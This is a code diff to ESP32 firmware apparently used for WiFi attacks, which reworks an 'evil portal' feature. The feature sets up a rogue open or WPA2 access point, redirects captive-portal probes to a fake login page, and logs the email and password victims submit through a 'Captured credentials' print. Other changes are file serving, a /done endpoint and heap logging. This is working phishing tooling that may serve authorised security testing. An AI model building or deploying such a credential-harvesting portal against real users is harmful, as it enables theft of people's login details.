@@ -3,6 +3,7 @@
 #include "managers/wifi_manager.h"
 #include "esp_crt_bundle.h"
 #include "esp_event.h"
+#include "esp_heap_caps.h" // Add include for heap stats
 #include "esp_http_client.h"
 #include "esp_log.h"
 #include "esp_timer.h"
@@ -31,6 +32,7 @@
 #endif
 // Include Outside so we have access to the Terminal View Macro
 #include "managers/views/terminal_screen.h"
+#include <inttypes.h> // Add include for PRIu32
 
 #define MAX_DEVICES 255
 #define CHUNK_SIZE 8192
@@ -41,8 +43,8 @@
 uint16_t ap_count;
 wifi_ap_record_t *scanned_aps;
 const char *TAG = "WiFiManager";
-char *PORTALURL = "";
-char *domain_str = "";
+static char PORTALURL[512] = "";
+static char domain_str[128] = "";
 EventGroupHandle_t wifi_event_group;
 const int WIFI_CONNECTED_BIT = BIT0;
 wifi_ap_record_t selected_ap;
@@ -54,6 +56,7 @@ esp_netif_t *wifiSTA;
 static uint32_t last_packet_time = 0;
 static uint32_t packet_counter = 0;
 static uint32_t deauth_packets_sent = 0;
+static bool login_done = false;
 
 struct service_info {
     const char *query;
@@ -135,6 +138,7 @@ static void event_handler(void *arg, esp_event_base_t event_base, int32_t event_
             break;
         case WIFI_EVENT_AP_STADISCONNECTED:
             printf("Station disconnected from AP\n");
+            login_done = false;
             break;
         case WIFI_EVENT_STA_START:
             printf("STA started\n");
@@ -352,29 +356,21 @@ void wifi_stations_sniffer_callback(void *buf, wifi_promiscuous_pkt_type_t type)
 }
 
 esp_err_t stream_data_to_client(httpd_req_t *req, const char *url, const char *content_type) {
-    printf("Requesting URL: %s\n", url);
+    httpd_resp_set_hdr(req, "Connection", "close");
 
-    if (strstr(url, "/mnt") != NULL) {
-        printf("URL points to a local file: %s\n", url);
-
+    if (strncmp(url, "http://", 7) != 0 && strncmp(url, "https://", 8) != 0) {
         FILE *file = fopen(url, "r");
         if (file == NULL) {
-            printf("Failed to open file: %s\n", url);
+            printf("Error: cannot open file %s\n", url);
             return ESP_FAIL;
         }
 
-        if (content_type) {
-            printf("Content-Type: %s\n", content_type);
-            httpd_resp_set_type(req, content_type);
-        } else {
-            printf("Content-Type not provided, using default 'application/octet-stream'\n");
-            httpd_resp_set_type(req, "application/octet-stream");
-        }
+        httpd_resp_set_type(req, content_type ? content_type : "application/octet-stream");
         httpd_resp_set_status(req, "200 OK");
 
         char *buffer = (char *)malloc(CHUNK_SIZE + 1);
         if (buffer == NULL) {
-            printf("Failed to allocate memory for buffer\n");
+            printf("Error: buffer allocation failed\n");
             fclose(file);
             return ESP_FAIL;
         }
@@ -382,24 +378,15 @@ esp_err_t stream_data_to_client(httpd_req_t *req, const char *url, const char *c
         int read_len;
         while ((read_len = fread(buffer, 1, CHUNK_SIZE, file)) > 0) {
             if (httpd_resp_send_chunk(req, buffer, read_len) != ESP_OK) {
-                printf("Failed to send chunk to client\n");
+                printf("Error: send chunk failed\n");
                 break;
             }
         }
 
-        if (feof(file)) {
-            printf("Finished reading data from file\n");
-        } else if (ferror(file)) {
-            printf("Error reading file\n");
-        }
-
-        // Clean up
         free(buffer);
         fclose(file);
-
-        // Send final chunk to end the response
         httpd_resp_send_chunk(req, NULL, 0);
-
+        printf("Served file: %s\n", url);
         return ESP_OK;
     } else {
         // Proceed with HTTP request if not an SD card file
@@ -447,13 +434,7 @@ esp_err_t stream_data_to_client(httpd_req_t *req, const char *url, const char *c
             int content_length = esp_http_client_fetch_headers(client);
             printf("Content length: %d\n", content_length);
 
-            if (content_type) {
-                printf("Content-Type: %s\n", content_type);
-                httpd_resp_set_type(req, content_type);
-            } else {
-                printf("Content-Type not provided, using default 'application/octet-stream'\n");
-                httpd_resp_set_type(req, "application/octet-stream");
-            }
+            httpd_resp_set_type(req, content_type ? content_type : "application/octet-stream");
 
             httpd_resp_set_hdr(req, "Content-Security-Policy",
                                "default-src 'self' 'unsafe-inline' data: blob:; "
@@ -526,6 +507,9 @@ esp_err_t stream_data_to_client(httpd_req_t *req, const char *url, const char *c
 }
 
 const char *get_content_type(const char *uri) {
+    if (strstr(uri, ".html")) {
+        return "text/html";
+    }
     if (strstr(uri, ".css")) {
         return "text/css";
     } else if (strstr(uri, ".js")) {
@@ -561,6 +545,17 @@ void build_file_url(const char *host, const char *uri, char *file_url, size_t ma
 
 esp_err_t file_handler(httpd_req_t *req) {
     const char *uri = req->uri;
+    const char *content_type = get_content_type(uri);
+    char local_path[512];
+    {
+        size_t maxlen = sizeof(local_path) - strlen("/mnt") - 1;
+        snprintf(local_path, sizeof(local_path), "/mnt%.*s", (int)maxlen, uri);
+    }
+    FILE *f = fopen(local_path, "r");
+    if (f) {
+        fclose(f);
+        return stream_data_to_client(req, local_path, content_type);
+    }
 
     const char *host = get_host_from_req(req);
     if (host == NULL) {
@@ -572,7 +567,6 @@ esp_err_t file_handler(httpd_req_t *req) {
     char file_url[512];
     build_file_url(host, uri, file_url, sizeof(file_url));
 
-    const char *content_type = get_content_type(uri);
     printf("Determined content type: %s for URI: %s\n", content_type, uri);
 
     esp_err_t result = stream_data_to_client(req, file_url, content_type);
@@ -582,8 +576,18 @@ esp_err_t file_handler(httpd_req_t *req) {
     return result;
 }
 
+esp_err_t done_handler(httpd_req_t *req) {
+    login_done = true;
+    const char *msg = "<html><body><h1>Portal closed</h1></body></html>";
+    httpd_resp_set_type(req, "text/html");
+    httpd_resp_send(req, msg, strlen(msg));
+    // no automatic shutdown
+    return ESP_OK;
+}
+
 esp_err_t portal_handler(httpd_req_t *req) {
     printf("Client requested URL: %s\n", req->uri);
+    ESP_LOGI(TAG, "Free heap before serving portal: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
 
     esp_err_t err = stream_data_to_client(req, PORTALURL, "text/html");
 
@@ -600,6 +604,7 @@ esp_err_t portal_handler(httpd_req_t *req) {
         httpd_resp_send(req, error_message, strlen(error_message));
     }
 
+    ESP_LOGI(TAG, "Free heap after serving portal: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
     return ESP_OK;
 }
 
@@ -626,40 +631,47 @@ esp_err_t get_log_handler(httpd_req_t *req) {
 
 esp_err_t get_info_handler(httpd_req_t *req) {
     char query[256] = {0};
-    char email[64] = {0};
-    char password[64] = {0};
+    char decoded_email[64] = {0};
+    char decoded_password[64] = {0};
 
     if (httpd_req_get_url_query_str(req, query, sizeof(query)) == ESP_OK) {
-        printf("Received query: %s\n", query);
-
-        if (get_query_param_value(query, "email", email, sizeof(email)) == ESP_OK) {
-            char decoded_email[64] = {0};
-            url_decode(decoded_email, email);
-            printf("Decoded email: %s\n", decoded_email);
-        } else {
-            printf("Email parameter not found\n");
+        char email_val[64] = {0};
+        char pass_val[64] = {0};
+        if (get_query_param_value(query, "email", email_val, sizeof(email_val)) == ESP_OK) {
+            url_decode(decoded_email, email_val);
         }
-
-        if (get_query_param_value(query, "password", password, sizeof(password)) == ESP_OK) {
-            char decoded_password[64] = {0};
-            url_decode(decoded_password, password);
-            printf("Decoded password: %s\n", decoded_password);
-        } else {
-            printf("Password parameter not found\n");
+        if (get_query_param_value(query, "password", pass_val, sizeof(pass_val)) == ESP_OK) {
+            url_decode(decoded_password, pass_val);
         }
-
-    } else {
-        printf("No query string found in request\n");
+        printf("Captured credentials: %s / %s\n", decoded_email, decoded_password);
     }
-
-    const char *resp_str = "Query parameters processed";
-    httpd_resp_send(req, resp_str, strlen(resp_str));
-
+    if (login_done) {
+        httpd_resp_set_status(req, "204 No Content");
+        httpd_resp_send(req, NULL, 0);
+    } else {
+        httpd_resp_set_status(req, "302 Found");
+        httpd_resp_set_hdr(req, "Location", "/login");
+        httpd_resp_send(req, NULL, 0);
+    }
     return ESP_OK;
 }
 
 esp_err_t captive_portal_redirect_handler(httpd_req_t *req) {
-    printf("Received request for captive portal detection endpoint: %s\n", req->uri);
+    ESP_LOGI(TAG, "Free heap at redirect handler entry: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
+    if (login_done) {
+        httpd_resp_set_status(req, "204 No Content");
+        httpd_resp_send(req, NULL, 0);
+        return ESP_OK;
+    }
+    const char *uri = req->uri;
+    if (strcmp(uri, "/generate_204") == 0 || strcmp(uri, "/hotspot-detect.html") == 0 || strcmp(uri, "/connecttest.txt") == 0) {
+        httpd_resp_set_status(req, "301 Moved Permanently");
+        httpd_resp_set_hdr(req, "Location", "http://192.168.4.1/login");
+        httpd_resp_send(req, NULL, 0);
+        ESP_LOGI(TAG, "Free heap at redirect handler exit: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
+        return ESP_OK;
+    }
+    // minimal logging for captive probe
 
     if (strstr(req->uri, "/get") != NULL) {
         get_info_handler(req);
@@ -676,11 +688,15 @@ esp_err_t captive_portal_redirect_handler(httpd_req_t *req) {
     snprintf(LocationRedir, sizeof(LocationRedir), "http://192.168.4.1/login");
     httpd_resp_set_hdr(req, "Location", LocationRedir);
     httpd_resp_send(req, NULL, 0);
+    ESP_LOGI(TAG, "Free heap at redirect handler exit: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
     return ESP_OK;
 }
 
 httpd_handle_t start_portal_webserver(void) {
     httpd_config_t config = HTTPD_DEFAULT_CONFIG();
+    config.max_uri_handlers = 16;
+    config.max_open_sockets = 7;
+    config.backlog_conn = 7;
     config.stack_size = 8192;
     if (httpd_start(&evilportal_server, &config) == ESP_OK) {
         httpd_uri_t portal_uri = {
@@ -707,6 +723,8 @@ httpd_handle_t start_portal_webserver(void) {
             .uri = ".css", .method = HTTP_GET, .handler = file_handler, .user_ctx = NULL};
         httpd_uri_t portal_js = {
             .uri = ".js", .method = HTTP_GET, .handler = file_handler, .user_ctx = NULL};
+        httpd_uri_t portal_html = {
+            .uri = ".html", .method = HTTP_GET, .handler = file_handler, .user_ctx = NULL};
         httpd_register_uri_handler(evilportal_server, &portal_uri_apple);
         httpd_register_uri_handler(evilportal_server, &portal_uri);
         httpd_register_uri_handler(evilportal_server, &portal_uri_android);
@@ -717,6 +735,9 @@ httpd_handle_t start_portal_webserver(void) {
         httpd_register_uri_handler(evilportal_server, &portal_jpg);
         httpd_register_uri_handler(evilportal_server, &portal_css);
         httpd_register_uri_handler(evilportal_server, &portal_js);
+        httpd_register_uri_handler(evilportal_server, &portal_html);
+        httpd_uri_t done_uri = { .uri = "/done", .method = HTTP_GET, .handler = done_handler, .user_ctx = NULL };
+        httpd_register_uri_handler(evilportal_server, &done_uri);
         httpd_register_err_handler(evilportal_server, HTTPD_404_NOT_FOUND,
                                    captive_portal_redirect_handler);
     }
@@ -725,10 +746,10 @@ httpd_handle_t start_portal_webserver(void) {
 
 esp_err_t wifi_manager_start_evil_portal(const char *URL, const char *SSID, const char *Password,
                                           const char *ap_ssid, const char *domain) {
-
+    login_done = false; // Reset login state on start
     if (strlen(URL) > 0 && strlen(domain) > 0) {
-        PORTALURL = URL;
-        domain_str = domain;
+        strlcpy(PORTALURL, URL, sizeof(PORTALURL));
+        strlcpy(domain_str, domain, sizeof(domain_str));
     }
 
     ap_manager_stop_services();
@@ -754,12 +775,24 @@ esp_err_t wifi_manager_start_evil_portal(const char *URL, const char *SSID, cons
                                    .beacon_interval = 100,
                                }};
 
-    if (SSID != NULL || Password != NULL) {
+    // Determine authmode based on provided password
+    wifi_auth_mode_t auth_mode = WIFI_AUTH_OPEN;
+    if (Password != NULL && strlen(Password) >= 8) {
+        auth_mode = WIFI_AUTH_WPA2_PSK; // Or WPA2_WPA3_PSK if supported/desired
+    }
+    ap_config.ap.authmode = auth_mode;
+
+    if (SSID != NULL && strlen(SSID) > 0 && Password != NULL && strlen(Password) >= 8 && !settings_get_portal_offline_mode(&G_Settings)) {
+        // Online mode with credentials
         strlcpy((char *)wifi_config.sta.ssid, SSID, sizeof(wifi_config.sta.ssid));
         strlcpy((char *)wifi_config.sta.password, Password, sizeof(wifi_config.sta.password));
 
-        strlcpy((char *)ap_config.sta.ssid, ap_ssid, sizeof(ap_config.sta.ssid));
-        ap_config.ap.authmode = WIFI_AUTH_OPEN;
+        strlcpy((char *)ap_config.ap.ssid, ap_ssid, sizeof(ap_config.ap.ssid));
+        ap_config.ap.ssid_len = strlen(ap_ssid);
+        // Copy password to AP config ONLY if auth mode requires it
+        if (auth_mode != WIFI_AUTH_OPEN) {
+             strlcpy((char *)ap_config.ap.password, Password, sizeof(ap_config.ap.password));
+        }
 
         ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));
 
@@ -813,9 +846,13 @@ esp_err_t wifi_manager_start_evil_portal(const char *URL, const char *SSID, cons
                                          .ip.type = ESP_IPADDR_TYPE_V4};
         esp_netif_set_dns_info(wifiAP, ESP_NETIF_DNS_MAIN, &dns_info);
     } else {
+        // Offline mode or missing/invalid credentials -> Open AP
         ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
-        strlcpy((char *)ap_config.sta.ssid, ap_ssid, sizeof(ap_config.sta.ssid));
-        ap_config.ap.authmode = WIFI_AUTH_OPEN;
+        strlcpy((char *)ap_config.ap.ssid, ap_ssid, sizeof(ap_config.ap.ssid));
+        ap_config.ap.ssid_len = strlen(ap_ssid);
+        ap_config.ap.authmode = WIFI_AUTH_OPEN; // Explicitly OPEN
+        // Ensure password field is empty for OPEN auth
+        memset(ap_config.ap.password, 0, sizeof(ap_config.ap.password));
 
         dhcps_offer_t dhcps_dns_value = OFFER_DNS;
         esp_netif_dhcps_option(wifiAP, ESP_NETIF_OP_SET, ESP_NETIF_DOMAIN_NAME_SERVER,
@@ -847,6 +884,7 @@ esp_err_t wifi_manager_start_evil_portal(const char *URL, const char *SSID, cons
 }
 
 void wifi_manager_stop_evil_portal() {
+    login_done = false; // Reset login state on stop
 
     if (dns_handle != NULL) {
         stop_dns_server(dns_handle);
